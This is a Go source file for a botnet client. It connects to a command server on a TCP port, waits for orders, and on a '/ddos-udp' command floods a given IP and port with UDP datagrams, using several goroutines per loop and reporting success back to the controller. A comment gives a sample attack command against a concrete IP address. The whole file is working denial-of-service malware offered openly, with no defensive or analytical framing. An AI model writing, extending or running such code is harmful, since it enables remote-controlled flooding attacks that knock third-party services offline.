package main

import (
	"fmt"
	"net"
	"strconv"
	"strings"
)

func CreateUdpDatagramm(data string, address string, port string) (string, *net.UDPAddr) {
	serverAddr, err := net.ResolveUDPAddr("udp", address+":"+port)
	if err != nil {
		fmt.Println("Error: ", err)
	}

	return data, serverAddr
}

func sendUdp(data string, serverAddr *net.UDPAddr) {
	conn, err := net.DialUDP("udp", nil, serverAddr)
	if err != nil {
		return
	}
	defer conn.Close()

	_, err = conn.Write([]byte(data))

	if err != nil {
		return
	}
}

func udpFlood(host string, port string, pkg_c int) {
	udpString := "<UDP>BABABUUY<UDP>"
	data, serverAddr := CreateUdpDatagramm(udpString, host, port)

	if pkg_c > 0 {
		for i := 0; i <= pkg_c; i++ {
			sendUdp(data, serverAddr)
			go sendUdp(data, serverAddr)
			go sendUdp(data, serverAddr)
			go sendUdp(data, serverAddr)

		}
	}
}

func sendData(conn net.Conn, data string) {
	_, err := conn.Write([]byte(data))
	fmt.Println("[Send] " + data)
	if err != nil {
		fmt.Println("Error sending data:", err)
		return
	}
}

func getIpPortWC(str string) (string, string, int) {

	cmdList := strings.Split(str, " ")
	ip := cmdList[1]
	Spkg_c := strings.Split(str, "-c ")[1]
	pkg_c, _ := strconv.Atoi(Spkg_c)

	if len(cmdList) > 2 {
		port := cmdList[2]

		return ip, port, pkg_c
	}
	return "None", "None", 0
}
func getSourceParram(cmd string) (string, error) {
	paramsList := strings.Split(cmd, " ")

	return paramsList[0], nil
}

func status() {
	fmt.Println("Status - Working . . .")
}

// DDOS cmd -> DDOS 163.217.31.78 8888 64
func source(cmd string, conn net.Conn) {
	cmdParam, _ := getSourceParram(cmd)

	fmt.Println(cmd)

	switch cmdParam {
	case "/ddos-udp":
		ip, port, pkg_c := getIpPortWC(cmd)
		udpFlood(ip, port, pkg_c)
		sendData(conn, "Udp.Flood&Success")

	case "/bot-status":
		sendData(conn, "<200> connection - Stable & err - 0")
	}
}

func main() {
	fmt.Println("_<DDL>[BOT](START)_")

	conn, _ := net.Dial("tcp", "localhost:6666")
	buffer := make([]byte, 1024)

	for {
		n, _ := conn.Read(buffer)
		req := string(buffer[:n])

		source(req, conn)

	}
}
